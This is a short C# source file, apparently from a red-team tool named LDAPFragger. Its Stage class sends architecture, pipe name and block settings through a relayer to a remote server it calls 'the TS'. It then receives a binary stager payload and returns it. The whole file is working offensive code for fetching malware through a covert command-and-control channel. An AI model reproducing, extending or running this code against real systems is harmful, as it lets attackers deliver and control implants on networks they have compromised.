using System.Text;

namespace LDAPFragger.Core
{
    class Stage
    {


        public static byte[] getStage(Transport.Relayer Relayer, string pipename, bool isX64)
        {
            var arch = isX64 ? "x64" : "x86";

            Misc.WriteGood(string.Format("Requesting stager..."));
            Relayer.Send(Encoding.ASCII.GetBytes("arch=" + arch));
            Relayer.Send(Encoding.ASCII.GetBytes("pipename=" + pipename));
            Relayer.Send(Encoding.ASCII.GetBytes("block=100"));
            Relayer.Send(Encoding.ASCII.GetBytes("go"));


            // Sleep a little so the TS can process the request
            System.Threading.Thread.Sleep(200);

            byte[] payload = Relayer.ReadFrame();
            Misc.WriteGood(string.Format("Received stager ({0} KB)", payload.Length / 1024));

            return payload;

        }

    }
}
